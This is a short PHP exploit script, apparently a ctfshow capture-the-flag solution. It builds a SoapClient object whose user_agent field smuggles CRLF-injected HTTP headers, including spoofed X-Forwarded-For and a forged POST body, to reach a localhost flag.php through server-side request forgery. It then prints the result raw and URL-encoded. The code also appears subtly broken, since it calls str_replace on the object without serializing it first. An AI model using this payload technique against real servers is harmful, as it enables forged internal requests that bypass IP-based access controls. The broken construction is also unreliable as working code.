<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$b = new SoapClient(null,array('location' => $target,
    'user_agent'=>'chendi^^X-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.
        '^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,
    'uri'=> "dwzzzzzzzzzz"));
$a = str_replace('^^',"\r\n",$b);
echo $a;
echo urlencode($a);
?>